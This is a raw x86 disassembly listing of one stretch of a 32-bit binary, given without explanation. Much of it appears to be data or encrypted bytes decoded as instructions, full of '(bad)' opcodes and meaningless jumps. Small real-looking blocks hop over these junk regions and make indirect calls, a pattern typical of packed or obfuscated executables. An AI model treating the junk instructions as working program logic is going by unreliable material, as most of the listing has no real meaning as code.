  407400:	xchg   DWORD PTR [eax+0x35d9fb47],eax
  407406:	pop    eax
  407407:	jo     0x407447
  407409:	shr    cl,1
  40740b:	fisttp WORD PTR [edx-0x242f55f0]
  407411:	ret    0x60a5
  407414:	jns    0x4073df
  407416:	cli    
  407417:	or     DWORD PTR [ebx+ecx*1+0x12],edx
  40741b:	movups xmm0,xmm5
  40741e:	pop    edi
  40741f:	lods   al,BYTE PTR ds:[esi]
  407420:	adc    al,0x1
  407422:	push   ds
  407423:	imul   esp,DWORD PTR [eax-0x52],0x8ea82d0c
  40742a:	dec    ebp
  40742b:	pop    edx
  40742c:	fadd   DWORD PTR [ecx+0x68e719c9]
  407432:	fwait
  407433:	mov    ah,0xd9
  407435:	mov    dh,0xd1
  407437:	mov    ebx,0xf8d3fbba
  40743c:	test   al,0x6b
  40743e:	sbb    bl,BYTE PTR [edx]
  407440:	push   ecx
  407441:	aas    
  407442:	mov    edi,0xd0334dda
  407447:	mov    edi,DWORD PTR [ebp-0x10]
  40744a:	or     DWORD PTR ds:0x430357,0x71a5
  407454:	add    edx,ecx
  407456:	mov    DWORD PTR ds:0x4302c9,0x5a49
  407460:	cmp    edi,edx
  407462:	mov    DWORD PTR ds:0x43034f,0x6748
  40746c:	jmp    0x40761d
  407471:	not    DWORD PTR [ebp+edx*8-0xca68ae7]
  407478:	push   eax
  407479:	jb     0x4074d4
  40747b:	out    dx,eax
  40747c:	or     BYTE PTR [ecx-0x48],al
  40747f:	call   FWORD PTR [ecx+0x35]
  407482:	lds    edi,FWORD PTR [esi+0x7e]
  407485:	mov    bh,BYTE PTR [edi+0x7e]
  407488:	jle    0x407454
  40748a:	shl    BYTE PTR [esi-0x10],1
  40748d:	dec    eax
  40748e:	jl     0x4074c8
  407490:	mov    ebp,0x40e05ff1
  407495:	inc    esi
  407496:	mov    WORD PTR [ecx],ss
  407498:	push   0x2e2000fa
  40749d:	mov    ecx,0x150d6852
  4074a2:	adc    DWORD PTR ds:0xae98634a,ebx
  4074a8:	jle    0x407434
  4074aa:	in     al,0x12
  4074ac:	stc    
  4074ad:	jg     0x4074da
  4074af:	jmp    0x407528
  4074b1:	ja     0x407489
  4074b3:	dec    edi
  4074b4:	out    dx,al
  4074b5:	call   0xc744ec4a
  4074ba:	(bad)  
  4074bb:	rol    DWORD PTR [ebx+0x51],1
  4074be:	inc    edi
  4074bf:	pop    esi
  4074c0:	loope  0x407469
  4074c2:	cdq    
  4074c3:	and    al,0xe3
  4074c5:	(bad)  [eax+0x41]
  4074c8:	out    0x3c,al
  4074ca:	jne    0x40754b
  4074cc:	aam    0x7c
  4074ce:	mov    esi,0x46356b74
  4074d3:	adc    ecx,edi
  4074d5:	scas   al,BYTE PTR es:[edi]
  4074d6:	cmp    DWORD PTR [eax],edx
  4074d8:	(bad)  
  4074d9:	out    0xe2,al
  4074db:	mov    edi,0x482e2bb8
  4074e0:	add    eax,0x140a2365
  4074e5:	add    eax,0x8d2b8d8b
  4074ea:	or     eax,0xa24c53b7
  4074ef:	(bad)  
  4074f0:	test   al,0x7e
  4074f2:	cmp    BYTE PTR [edi],ah
  4074f4:	cmc    
  4074f5:	xchg   esp,eax
  4074f6:	ins    DWORD PTR es:[edi],dx
  4074f7:	ror    al,0xe4
  4074fa:	rcr    cl,0xaa
  4074fd:	xchg   ebp,eax
  4074fe:	aam    0x51
  407500:	inc    esi
  407501:	aaa    
  407502:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407503:	outs   dx,WORD PTR ds:[esi]
  407505:	ror    ecx,0xed
  407508:	aas    
  407509:	dec    eax
  40750a:	fsub   st(6),st
  40750c:	pop    esp
  40750d:	dec    ebx
  40750e:	mov    ebx,0xc1537eb2
  407513:	shr    DWORD PTR [edi],0x67
  407516:	pop    esp
  407517:	add    al,0x1c
  407519:	out    0xba,al
  40751b:	pop    eax
  40751c:	and    cl,BYTE PTR [ebp-0x4d]
  40751f:	mov    bh,BYTE PTR cs:[eax+0x1a]
  407523:	sbb    eax,0x2375ef76
  407528:	mov    ecx,0xcbbd577d
  40752d:	stc    
  40752e:	test   BYTE PTR [ecx],ah
  407530:	cmp    al,0xcc
  407532:	mov    esp,0xe7d52c62
  407537:	mov    eax,DWORD PTR [edi+0xc]
  40753a:	adc    BYTE PTR [ebx-0x6dc5f614],0xdd
  407541:	loopne 0x407557
  407543:	inc    edx
  407544:	jae    0x407592
  407546:	or     eax,0xfa791460
  40754b:	and    ebx,DWORD PTR [eax+edx*1+0x35]
  40754f:	(bad)  
  407550:	mov    BYTE PTR [edx+0x74003d65],al
  407556:	(bad)  
  407557:	sub    edx,DWORD PTR [eax]
  407559:	pop    esp
  40755a:	retf   0x412
  40755d:	retf   0xabd
  407560:	jp     0x4075de
  407562:	inc    ebp
  407563:	push   edx
  407564:	jmp    0xb607:0x2a08fcbe
  40756b:	ds mov cl,0x5a
  40756e:	out    dx,eax
  40756f:	jb     0x4075de
  407571:	sbb    ch,BYTE PTR [edx+0x3e]
  407574:	test   eax,0x2bd1316b
  407579:	xor    eax,0x36415f91
  40757e:	push   ecx
  40757f:	bound  ebx,QWORD PTR [edi+0x43274f6f]
  407585:	iret   
  407586:	mov    esi,esp
  407588:	xchg   ecx,eax
  407589:	in     eax,dx
  40758a:	push   edi
  40758b:	arpl   WORD PTR [ecx+0x9acc027],di
  407591:	or     esi,DWORD PTR [ebx+edx*2]
  407594:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407595:	xchg   ebp,eax
  407596:	jecxz  0x407580
  407598:	mov    ebx,0x3235266b
  40759d:	adc    DWORD PTR [esp+ebx*8-0x3827266a],esp
  4075a4:	xor    edi,DWORD PTR [ecx]
  4075a6:	sahf   
  4075a7:	and    al,0x8d
  4075a9:	add    ch,ah
  4075ab:	scas   al,BYTE PTR es:[edi]
  4075ac:	mov    al,ds:0x741dbde
  4075b1:	das    
  4075b2:	sbb    ch,BYTE PTR [ebx]
  4075b4:	or     DWORD PTR [eax+0x6daf42c7],ebx
  4075ba:	js     0x407554
  4075bc:	test   al,dl
  4075be:	out    0x2c,al
  4075c0:	push   0x5e
  4075c2:	mov    ecx,0x76a3568f
  4075c7:	(bad)  
  4075c8:	sub    eax,0xc081d1fe
  4075cd:	sbb    al,0x72
  4075cf:	add    al,0x41
  4075d1:	jg     0x40763e
  4075d3:	fwait
  4075d4:	and    al,0xa2
  4075d6:	pop    edi
  4075d7:	es ds push edi
  4075da:	ja     0x40755f
  4075dc:	cdq    
  4075dd:	xchg   ebp,eax
  4075de:	cmp    edi,DWORD PTR [eax+0x53]
  4075e1:	xchg   ebp,eax
  4075e2:	loopne 0x4075db
  4075e4:	xchg   BYTE PTR [ebp-0x66220930],dl
  4075ea:	scas   eax,DWORD PTR es:[edi]
  4075eb:	ja     0x407610
  4075ed:	test   dh,bl
  4075ef:	addr16 jmp 0xf649:0xce05d086
  4075f7:	aas    
  4075f8:	jno    0x4075ee
  4075fa:	retf   
  4075fb:	push   edi
  4075fc:	jno    0x4075d3
  4075fe:	mov    eax,0x11d2b278
  407603:	dec    ecx
  407604:	gs fwait
  407606:	hlt    
  407607:	jne    0x407636
  407609:	sub    esi,esi
  40760b:	and    ebp,DWORD PTR [edi]
  40760d:	fsubr  QWORD PTR [ebx+0x28814ff2]
  407613:	xchg   ebx,eax
  407614:	ucomiss xmm2,DWORD PTR [eax+0x2]
  407618:	mov    bh,0xd3
  40761a:	(bad)  
  40761b:	sahf   
  40761c:	bnd je 0x40910e
  407623:	push   ebx
  407624:	jmp    0x408d87
  407629:	and    DWORD PTR ds:0x42ec4b,0x0
  407633:	jmp    0x407647
  407638:	xor    edx,edx
  40763a:	xor    edx,DWORD PTR ds:0x42ec4b
  407640:	inc    edx
  407641:	mov    DWORD PTR ds:0x42ec4b,edx
  407647:	cmp    DWORD PTR ds:0x42ec4b,0x1b
  40764e:	jae    0x40768b
  407654:	cmp    DWORD PTR ds:0x42ec4b,0xa
  40765b:	jne    0x40766a
  407661:	push   DWORD PTR [ebp-0x10]
  407664:	call   DWORD PTR ds:0x42e933
  40766a:	cmp    DWORD PTR ds:0x42ec4b,0x9
  407671:	jne    0x407686
  407677:	xor    edx,edx
  407679:	xor    edx,DWORD PTR ds:0x42ec4b
  40767f:	inc    edx
  407680:	mov    DWORD PTR ds:0x42ec4b,edx
  407686:	jmp    0x407638
  40768b:	mov    edx,DWORD PTR [ebp-0x8]
  40768e:	mov    edi,DWORD PTR [ebp-0x10]
  407691:	sub    edi,edx
  407693:	jmp    0x407844
  407698:	or     DWORD PTR [ecx+0x67a86788],ebp
  40769e:	icebp  
  40769f:	jno    0x407690
  4076a1:	out    dx,al
  4076a2:	jns    0x4076bb
  4076a4:	pushf  
  4076a5:	out    dx,eax
  4076a6:	into   
  4076a7:	hlt    
  4076a8:	inc    ecx
  4076a9:	ret    0x7e7e
  4076ac:	mov    bh,BYTE PTR [edi+0x7e]
  4076af:	jle    0x407634
  4076b1:	fs jb  0x407699
  4076b4:	shr    ebp,1
  4076b6:	push   es
  4076b7:	les    esp,FWORD PTR [ebx+0x530117eb]
  4076bd:	stc    
  4076be:	dec    esp
  4076bf:	dec    esp
  4076c0:	or     bh,bh
  4076c2:	pop    ss
  4076c3:	sahf   
  4076c4:	cmp    ah,BYTE PTR [edi]
  4076c6:	clc    
  4076c7:	(bad)  
  4076c8:	shl    bl,1
  4076ca:	pop    esi
  4076cb:	dec    esp
  4076cc:	mov    bl,0x78
  4076ce:	jp     0x4076d5
  4076d0:	xchg   esp,esp
  4076d2:	push   esp
  4076d3:	(bad)  
  4076d4:	jmp    0x4076e0
  4076d6:	stc    
  4076d7:	test   BYTE PTR [ebp+0x2477edd8],al
  4076dd:	cmp    al,0x5d
  4076df:	cmp    ebx,ebx
  4076e1:	rcl    BYTE PTR [esi+0x2cd7d5ad],cl
  4076e7:	mov    ch,0x98
  4076e9:	mov    dh,0x82
  4076eb:	das    
  4076ec:	shl    BYTE PTR [ebx],cl
  4076ee:	xor    BYTE PTR [eax],al
  4076f0:	pop    esi
  4076f1:	mov    eax,0x9a5407c9
  4076f6:	ins    DWORD PTR es:[edi],dx
  4076f7:	inc    eax
  4076f8:	stc    
  4076f9:	jg     0x40775d
  4076fb:	jno    0x407754
  4076fd:	push   ebp
  4076fe:	pushf  
  4076ff:	xor    al,BYTE PTR [ecx]
  407701:	dec    eax
  407702:	fstp   QWORD PTR [ebx-0x7f]
  407705:	adc    esp,DWORD PTR [ebx]
  407707:	daa    
  407708:	jmp    0x5dee:0x91a3aade
  40770f:	enter  0x99e6,0x49
  407713:	je     0x4076fe
  407715:	cmp    edx,edx
  407717:	lods   eax,DWORD PTR ds:[esi]
  407718:	mov    esi,0x790e2c4f
  40771d:	push   eax
  40771e:	(bad)  
  40771f:	daa    
  407720:	out    0x65,eax
  407722:	dec    edx
  407723:	or     DWORD PTR [esi-0x6b],ecx
  407726:	mov    BYTE PTR [ebx],cl
  407728:	aam    0x7c
  40772a:	jecxz  0x4076da
  40772c:	dec    ebx
  40772d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40772e:	cld    
  40772f:	imul   edx,DWORD PTR [eax],0xea5602d3
  407735:	push   0x62c8c7ac
  40773a:	das    
  40773b:	mov    esp,0x28f59cff
  407740:	mov    eax,DWORD PTR [ecx+0x5cbdc9c6]
  407746:	xor    al,bh
  407748:	sub    dl,dl
  40774a:	inc    edi
  40774b:	(bad)  
  40774d:	push   DWORD PTR [esi+0x6a]
  407750:	pushf  
  407751:	in     eax,dx
  407752:	jo     0x407746
  407754:	les    eax,FWORD PTR [edx]
  407756:	and    eax,0x31d4dec8
  40775b:	addr16 inc esi
  40775d:	push   0xcac6d2fe
  407762:	ret    0xba90
  407765:	imul   eax,DWORD PTR [ebx],0x45
  407768:	lods   eax,DWORD PTR ds:[esi]
  407769:	mov    al,0xfb
  40776b:	or     eax,0xaa842f1d
  407770:	outs   dx,BYTE PTR ds:[esi]
  407771:	xchg   DWORD PTR [edi+edi*2+0x3b],edi
  407775:	sbb    al,0x4c
  407777:	push   ebx
  407778:	jbe    0x4077e6
  40777a:	out    0x8a,eax
  40777c:	mov    bh,0xb7
  40777e:	outs   dx,BYTE PTR ds:[esi]
  40777f:	ror    BYTE PTR [ecx+edx*8-0x5153d3d5],cl
  407786:	inc    edx
  407787:	mov    ebp,0xeb6dc45c
  40778c:	xchg   edi,eax
  40778d:	dec    eax
  40778e:	mov    bl,0x48
  407790:	sub    bl,bh
  407792:	sbb    ebp,esi
  407794:	nop
  407795:	jp     0x407803
  407797:	mov    ebx,0x9420a0fa
  40779c:	call   0xbbe9e380
  4077a1:	aad    0xed
  4077a3:	ret    
  4077a4:	cld    
  4077a5:	sub    ebx,edi
  4077a7:	not    DWORD PTR [edx]
  4077a9:	sar    DWORD PTR [edx-0x54711dcb],1
  4077af:	mov    bl,0x3a
  4077b1:	xchg   edx,eax
  4077b3:	sub    edx,ebx
  4077b5:	test   BYTE PTR [eax+eax*4-0x113cedc],ah
  4077bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077bd:	push   ecx
  4077be:	mov    BYTE PTR [eax-0x5],dl
  4077c1:	mov    ebp,0xda713583
  4077c6:	xchg   BYTE PTR [ecx+0x56cf64d7],dl
  4077cc:	inc    ecx
  4077cd:	js     0x4077a9
  4077cf:	mov    eax,0x9bba69e
  4077d4:	leave  
  4077d5:	(bad)  
  4077d7:	and    DWORD PTR [ebx],eax
  4077d9:	fstp   QWORD PTR [esi-0x2aa5e530]
  4077df:	int3   
  4077e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077e1:	fisub  WORD PTR [ebx+0x77]
  4077e4:	aad    0xb6
  4077e6:	inc    edi
  4077e7:	out    dx,eax
  4077e8:	popa   
  4077e9:	and    esi,0xfd471e6d
  4077ef:	jge    0x4077cd
  4077f1:	jle    0x407835
  4077f3:	scas   al,BYTE PTR es:[edi]
  4077f4:	aam    0xce
  4077f6:	xchg   ebp,eax
  4077f7:	or     DWORD PTR [esi+0x1a],0x20
  4077fb:	jne    0x4077bc
  4077fd:	loop   0x4077c4
  4077ff:	je     0x407862
  407801:	lods   eax,DWORD PTR ds:[esi]
  407802:	dec    eax
  407803:	pop    WORD PTR ds:[edx+0x163e9a40]
  40780b:	sbb    eax,0x67d3fea6
  407810:	std    
  407811:	mov    edx,0xca82ea6e
  407816:	test   DWORD PTR [ecx+ecx*8+0x2dfb2de7],esp
  40781d:	fdiv   DWORD PTR [esi+0x7d]
  407820:	push   esi
  407821:	mov    eax,ds:0xeec698eb
  407826:	adc    ah,BYTE PTR [ebx+ecx*1-0x41322c95]
  40782d:	push   edx
  40782e:	push   ds
  40782f:	int    0x70
  407831:	lahf   
  407832:	pop    ds
  407833:	jns    0x407896
  407835:	shl    DWORD PTR [ebx],cl
  407837:	or     BYTE PTR [ebx-0x3ba031a9],bh
  40783d:	pop    es
  40783e:	mov    bl,0x75
  407840:	sar    DWORD PTR [ebx],0xfe
  407843:	mov    ds:0x81fc558b,eax
  407848:	adc    eax,0x4302c9
  40784d:	dec    edi
  40784e:	add    eax,DWORD PTR [ebx+0x0]
  407851:	xor    edx,eax
  407853:	add    edx,ecx
  407855:	cmp    edi,edx
  407857:	mov    DWORD PTR ds:0x4302ed,0x688e
  407861:	jb     0x40910d
  407867:	mov    DWORD PTR ds:0x42e644,0x1e
  407871:	cmp    DWORD PTR ds:0x42e644,0x0
  407878:	je     0x4078a9
  40787e:	cmp    DWORD PTR ds:0x42e644,0x25
  407885:	jne    0x407896
  40788b:	push   0x2141
  407890:	call   DWORD PTR ds:0x42e937
  407896:	mov    edi,DWORD PTR ds:0x42e644
  40789c:	dec    edi
  40789d:	mov    DWORD PTR ds:0x42e644,edi
  4078a3:	jmp    0x407871
  4078a8:	inc    edx
  4078a9:	mov    edx,DWORD PTR [ebp-0x28]
  4078ac:	mov    edi,DWORD PTR [ebp-0x4]
  4078af:	xor    edx,eax
  4078b1:	xor    edi,eax
  4078b3:	sub    ebx,DWORD PTR ds:0x42ec4f
  4078b9:	add    edi,ecx
  4078bb:	add    edx,ecx
  4078bd:	and    DWORD PTR ds:0x4302bd,0x0
  4078c7:	xor    ebx,ebx
  4078c9:	or     ebx,DWORD PTR ds:0x4302bd
  4078cf:	inc    ebx
  4078d0:	mov    DWORD PTR ds:0x4302bd,ebx
  4078d6:	cmp    DWORD PTR ds:0x4302bd,0x15
  4078dd:	jne    0x4078f1
  4078e3:	push   0x1
  4078e5:	push   DWORD PTR [ebp-0x20]
  4078e8:	push   DWORD PTR [ebp-0x10]
  4078eb:	call   DWORD PTR ds:0x42eaa7
  4078f1:	cmp    DWORD PTR ds:0x4302bd,0x11
  4078f8:	jb     0x4078c7
  4078fe:	imul   edx,edi
  407901:	mov    edi,DWORD PTR [ebp-0x8]
  407904:	mov    ebx,DWORD PTR [ebp-0x10]
  407907:	sub    ebx,edi
  407909:	cmp    ebx,edx
  40790b:	ja     0x40791d
  407911:	mov    edx,DWORD PTR [ebp-0x4]
  407914:	xor    edx,eax
  407916:	add    edx,ecx
  407918:	jmp    0x40877e
  40791d:	mov    edx,DWORD PTR [ebp-0x2c]
  407920:	mov    edi,DWORD PTR [ebp-0x4]
  407923:	xor    edx,eax
  407925:	xor    edi,eax
  407927:	add    edi,ecx
  407929:	add    edx,ecx
  40792b:	imul   edx,edi
  40792e:	mov    edi,DWORD PTR [ebp-0x8]
  407931:	jmp    0x407ae2
  407936:	ret    0x1100
  407939:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40793a:	shl    DWORD PTR [ebp+0x7ad26172],1
  407940:	dec    edi
  407941:	push   DWORD PTR [esi-0x28]
  407944:	shr    DWORD PTR [ebx*8-0x75818140],1
  40794b:	jg     0x4079cb
  40794d:	jle    0x40798c
  40794f:	(bad)  
  407951:	jge    0x4078e5
  407953:	inc    eax
  407954:	jmp    0xcd3ac5f6
  407959:	neg    BYTE PTR [eax+0x5640ae36]
  40795f:	out    dx,eax
  407960:	lds    esi,FWORD PTR [eax-0x7c9ef187]
  407966:	daa    
  407967:	ss lock clc 
  40796a:	lahf   
  40796b:	iret   
  40796c:	dec    edx
  40796d:	push   esi
  40796e:	jns    0x407913
  407970:	loopne 0x40795b
  407972:	sub    ebx,esp
  407974:	xor    DWORD PTR ss:[si+0x6e],edx
  407979:	and    eax,0xdbeef86
  40797e:	pop    esi
  40797f:	or     ebp,DWORD PTR [edx]
  407981:	sub    BYTE PTR [ebp-0x55],bl
  407984:	mov    edx,0x3914f59b
  407989:	iret   
  40798a:	(bad)  
  40798b:	push   esi
  40798c:	pop    esp
  40798d:	cdq    
  40798e:	mov    ah,0xbb
  407990:	lahf   
  407991:	cdq    
  407992:	and    ebp,DWORD PTR [esi+0x1252b16d]
  407998:	aam    0x2e
  40799a:	pop    esp
  40799b:	mov    al,ds:0x9d0fa721
  4079a0:	mov    edi,DWORD PTR [edi]
  4079a2:	or     eax,0x3d085235
  4079a7:	cmp    bh,cl
  4079a9:	ins    BYTE PTR es:[edi],dx
  4079aa:	sub    eax,esi
  4079ac:	mov    edi,0x67e229af
  4079b1:	pushf  
  4079b2:	mov    dl,0x77
  4079b4:	inc    ebx
  4079b5:	mov    edi,0xb0e927cb
  4079ba:	push   esi
  4079bb:	lahf   
  4079bc:	fs and eax,0xe4105710
  4079c2:	inc    ebp
  4079c3:	(bad)  
  4079c4:	jle    0x407974
  4079c6:	out    0xed,al
  4079c8:	hlt    
  4079c9:	test   DWORD PTR [esi*2-0x5dfe557a],ecx
  4079d0:	sub    al,0x62
  4079d2:	int    0x1b
  4079d4:	mov    ecx,0x5548cd2c
  4079d9:	cmc    
  4079da:	push   ss
  4079db:	iret   
  4079dc:	push   edx
  4079dd:	cwde   
  4079de:	push   esp
  4079df:	jns    0x407a43
  4079e1:	sub    eax,0xf1aeba96
  4079e6:	inc    edx
  4079e7:	fs (bad) 
  4079e9:	fnstsw WORD PTR [eax-0x646157b0]
  4079ef:	int    0xc9
  4079f1:	or     esi,ebx
  4079f3:	add    DWORD PTR [edi-0x40062843],eax
  4079f9:	xchg   ebx,eax
  4079fa:	xlat   BYTE PTR ds:[ebx]
  4079fb:	add    al,0x11
  4079fd:	mov    DWORD PTR [esi],ebp
  4079ff:	cli    
  407a00:	lahf   
  407a01:	mov    al,0x38
  407a03:	xor    al,0x8c
  407a05:	ret    
  407a06:	ret    0x4995
  407a09:	add    dl,dl
  407a0b:	stc    
  407a0c:	xchg   DWORD PTR [edi+edi*4-0x2],ebp
  407a10:	dec    esi
  407a11:	dec    ebp
  407a12:	jae    0x407a13
  407a14:	cmp    al,0x73
  407a16:	jns    0x4079eb
  407a18:	mov    ecx,0x83b612db
  407a1d:	dec    DWORD PTR [ebx]
  407a1f:	loop   0x407a44
  407a21:	ret    0xff9e
  407a24:	out    dx,al
  407a25:	sub    ebx,DWORD PTR es:[ebx+0x59]
  407a29:	xor    ebp,0x49c44123
  407a2f:	mov    dh,0x46
  407a31:	aad    0x36
  407a33:	jp     0x407a0d
  407a35:	daa    
  407a36:	mov    dl,0x16
  407a38:	fild   QWORD PTR [esi]
  407a3a:	sub    bh,BYTE PTR [ebx]
  407a3c:	(bad)  
  407a3e:	mov    ds:0xb2b0ccca,al
  407a43:	lock sub eax,DWORD PTR [ecx+0x4e1c299f]
  407a4a:	push   ebx
  407a4b:	test   al,0xaf
  407a4d:	in     eax,0x18
  407a4f:	adc    DWORD PTR [ebx+0x56],esi
  407a52:	out    0xda,al
  407a54:	fist   DWORD PTR [ebp+0x61167455]
  407a5a:	add    ebp,DWORD PTR [esi]
  407a5c:	push   bp
  407a5e:	cmp    BYTE PTR [esi],ch
  407a60:	(bad)
  407a65:	or     BYTE PTR [edi+0x76],cl
  407a68:	push   ss
  407a69:	jmp    0x407a0c
  407a6b:	jns    0x407a68
  407a6d:	mov    ecx,0xddcfe337
  407a72:	add    cl,BYTE PTR [esi+0x41]
  407a75:	ret    0xc02f
  407a78:	mov    fs,eax
  407a7a:	imul   ebp,eax,0x199e9213
  407a80:	cmp    bl,dh
  407a82:	fcom   QWORD PTR [ecx+0x2b866c18]
  407a88:	jmp    0x9738e399
  407a8d:	or     edx,DWORD PTR ds:0xa146b484
  407a93:	ja     0x407a18
  407a95:	je     0x407a88
  407a97:	dec    ebx
  407a98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a99:	push   ecx
  407a9a:	sub    eax,0x6a2b554d
  407a9f:	sub    eax,0x23cbfd58
  407aa4:	hlt    
  407aa5:	out    0x81,al
  407aa7:	(bad)  
  407aa8:	idiv   BYTE PTR [esi+edx*1]
  407aab:	inc    edx
  407aac:	scas   al,BYTE PTR es:[edi]
  407aad:	sti    
  407aae:	or     al,0xc6
  407ab0:	fiadd  WORD PTR [edi]
  407ab2:	cmp    esp,ebp
  407ab4:	pcmpgtb mm4,mm4
  407ab7:	push   cs
  407ab8:	daa    
  407ab9:	(bad)  
  407aba:	push   edx
  407abb:	iret   
  407abc:	jp     0x407a5f
  407abe:	mov    edx,0xbbf55199
  407ac3:	or     BYTE PTR [esi],ah
  407ac5:	outs   dx,DWORD PTR ds:[esi]
  407ac6:	xchg   edx,eax
  407ac7:	and    BYTE PTR [esi+0x5e],bh
  407aca:	das    
  407acb:	mov    eax,ds:0xeafa5e72
  407ad0:	mov    ecx,0xb3fdf714
  407ad5:	dec    ebx
  407ad6:	out    0x3c,eax
  407ad8:	xor    DWORD PTR [eax-0x17f776dc],ecx
  407ade:	xchg   edi,eax
  407adf:	sub    al,0xe
  407ae1:	jns    0x407a6e
  407ae3:	pop    ebp
  407ae4:	lock sub ebx,edi
  407ae7:	cmp    ebx,edx
  407ae9:	ja     0x407af7
  407aef:	mov    edx,DWORD PTR [ebp-0x28]
  407af2:	jmp    0x408770
  407af7:	mov    edx,DWORD PTR [ebp-0x30]
  407afa:	mov    edi,DWORD PTR [ebp-0x4]
  407afd:	jmp    0x407cae
  407b02:	mov    WORD PTR [edx+0x6130bf0c],?
  407b08:	dec    ebp
  407b09:	jno    0x407ae6
  407b0b:	les    ecx,FWORD PTR [esi-0x23a75b36]
  407b11:	loope  0x407b7c
  407b13:	sar    DWORD PTR [esi+0x7e],0x8a
  407b17:	jg     0x407b97
  407b19:	jle    0x407b14
  407b1b:	rcl    BYTE PTR [ecx],1
  407b1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b1e:	jecxz  0x407b46
  407b20:	in     al,0x16
  407b22:	leave  
  407b23:	jmp    0xad4e0924
  407b28:	push   esp
  407b29:	mov    eax,0xc88d85eb
  407b2e:	stos   DWORD PTR es:[edi],eax
  407b2f:	ret    0xad2b
  407b32:	outs   dx,DWORD PTR ds:[esi]
  407b33:	add    al,0xdc
  407b35:	pop    edx
  407b36:	aam    0x29
  407b38:	push   cs
  407b39:	sar    DWORD PTR [edx],0x17
  407b3c:	arpl   WORD PTR [edi-0x53],bx
  407b3f:	aam    0x66
  407b41:	push   es
  407b42:	rol    DWORD PTR [edx+0x108f62dd],cl
  407b48:	shr    BYTE PTR es:[edi+0x30a45b2b],1
  407b4f:	mov    ds:0x41b43834,eax
  407b54:	loop   0x407ba2
  407b56:	sbb    dh,ch
  407b58:	aad    0x59
  407b5a:	(bad)  
  407b5b:	cwde   
  407b5c:	mov    ecx,0x4d72121c
  407b61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b62:	mov    ebx,ss
  407b64:	loopne 0x407b3f
  407b66:	cs add cl,dl
  407b69:	sbb    DWORD PTR ds:0x85f5dc4b,ebp
  407b6f:	adc    BYTE PTR [eax+0x3e5ed981],0x8a
  407b76:	mov    al,ds:0xa3d92e10
  407b7b:	bound  esp,QWORD PTR [edi-0x72134d07]
  407b81:	pop    edi
  407b82:	jl     0x407b2c
  407b84:	add    ebp,DWORD PTR [edi]
  407b86:	fstp   QWORD PTR [ecx-0x18ad09c3]
  407b8c:	jmp    0x459a:0xb92aee77
  407b93:	icebp  
  407b94:	in     al,dx
  407b95:	in     al,dx
  407b96:	xchg   ch,ch
  407b98:	jmp    0x60bd8040
  407b9d:	xchg   DWORD PTR [eax-0x4e5f1256],esi
  407ba3:	aas    
  407ba4:	dec    edi
  407ba5:	fmul   QWORD PTR [edx+0x75a9ac66]
  407bab:	leave  
  407bac:	adc    eax,0x341fc143
  407bb1:	je     0x407b84
  407bb3:	sbb    dh,BYTE PTR [ecx]
  407bb5:	ret    
  407bb6:	mov    esp,0xbbdbdf0d
  407bbb:	iret   
  407bbc:	add    BYTE PTR [ecx],bl
  407bbe:	shr    DWORD PTR [ebp+0x23bc4c49],cl
  407bc4:	push   ecx
  407bc5:	ins    DWORD PTR es:[edi],dx
  407bc6:	inc    esi
  407bc7:	sub    dl,BYTE PTR [edx]
  407bc9:	outs   dx,BYTE PTR ds:[esi]
  407bca:	dec    eax
  407bcb:	aaa    
  407bcc:	in     eax,0xcf
  407bce:	pop    ds
  407bcf:	leave  
  407bd0:	jg     0x407c27
  407bd2:	sub    al,0xf
  407bd4:	xchg   ch,ch
  407bd6:	(bad)  
  407bd7:	fst    QWORD PTR [edx]
  407bd9:	cmp    eax,0xb907c24
  407bde:	xor    ebp,DWORD PTR [eax+0x5b]
  407be1:	out    0xeb,eax
  407be3:	cmp    al,0x7e
  407be5:	mov    ah,0xc6
  407be7:	push   edi
  407be8:	mov    cl,0x17
  407bea:	stos   BYTE PTR es:[edi],al
  407beb:	sub    eax,0xc18caac3
  407bf0:	stos   DWORD PTR es:[edi],eax
  407bf1:	nop    DWORD PTR [eax]
  407bf4:	or     BYTE PTR [ecx],al
  407bf6:	add    DWORD PTR [edx+0x7e16d6e3],0x47
  407bfd:	pusha  
  407bfe:	sub    ch,ah
  407c00:	pop    ecx
  407c01:	es in  eax,dx
  407c03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c04:	aam    0x2b
  407c06:	sub    DWORD PTR [edx-0x25b44376],0x6a10ff84
  407c10:	xor    ch,ch
  407c12:	xchg   esp,eax
  407c13:	add    DWORD PTR [edx],ecx
  407c15:	out    0x52,al
  407c17:	sar    edi,0x29
  407c1a:	and    eax,0xa1194ac7
  407c1f:	and    ebp,DWORD PTR [edx+ebx*1]
  407c22:	leave  
  407c23:	mov    ecx,0x18a07013
  407c28:	jno    0x407bd7
  407c2a:	xor    al,0xdc
  407c2c:	pusha  
  407c2d:	pusha  
  407c2e:	int    0xbd
  407c30:	fadd   QWORD PTR [eax-0x541888e5]
  407c36:	popf   
  407c37:	rol    DWORD PTR ds:[ebx-0x2f],1
  407c3b:	mov    WORD PTR [ebx+0x6d],ss
  407c3e:	shl    BYTE PTR [edx-0x3a],1
  407c41:	std    
  407c42:	outs   dx,BYTE PTR ds:[esi]
  407c43:	(bad)  
  407c44:	fstp   TBYTE PTR [ebp+0x26]
  407c47:	jmp    0x407c8d
  407c49:	sbb    DWORD PTR [edx],ebp
  407c4b:	stos   BYTE PTR es:[edi],al
  407c4c:	sbb    edx,DWORD PTR [esi]
  407c4e:	jbe    0x407cc6
  407c50:	inc    esi
  407c51:	(bad)  
  407c52:	call   0xa2d02ed9
  407c57:	inc    edx
  407c58:	xchg   edx,eax
  407c59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c5a:	mov    edi,0xa0978d71
  407c5f:	dec    ebp
  407c60:	enter  0xf12e,0x50
  407c64:	mov    BYTE PTR [ebx+edx*1+0x43bedcf6],cl
  407c6b:	sub    BYTE PTR ds:0x19e93c9e,cl
  407c71:	out    dx,eax
  407c72:	dec    eax
  407c73:	sub    al,0x32
  407c75:	test   DWORD PTR [eax+0x16],ecx
  407c78:	inc    esp
